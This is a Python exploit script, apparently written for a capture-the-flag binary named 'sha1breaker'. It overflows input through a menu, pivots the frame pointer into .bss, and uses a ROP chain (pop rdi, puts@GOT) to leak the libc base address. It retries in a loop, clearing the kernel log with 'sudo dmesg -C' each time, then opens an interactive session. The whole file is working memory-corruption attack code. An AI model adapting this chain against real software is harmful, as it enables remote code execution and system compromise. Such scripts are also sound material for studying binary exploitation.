from ptrlib import *
import os

addr_start = 0x400930
#addr_start = 0x400dbe
rop_pop_rdi = 0x00400ec3
rop_ret = 0x00400ec4

libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
elf = ELF("./sha1breaker")

while True:
    os.system("sudo dmesg -C")
    sock = Process("./sha1breaker")
    
    for i in range(0x64):
        sock.sendafter(">> ", b"1" + b"\xff" * 0x1f)
    payload  = b'0' + p64(elf.section(".bss") + 0x400)[1:]
    payload += p64(rop_pop_rdi)
    payload += p64(elf.got("puts"))
    #payload += p64(0x400dca)
    payload += p64(0x400bd0)
    _ = input()
    sock.sendafter(">> ", payload)
    _ = input()
    r = sock.recvline(timeout=0.1)
    if r is None or r == b'' or r == b'Menu':
        sock.close()
        continue
    libc_base = u64(r) - libc.symbol("puts")
    if libc_base >= 1 << 64:
        sock.close()
        continue
    logger.info("libc_base = " + hex(libc_base))
    
    sock.interactive()
    exit(0)
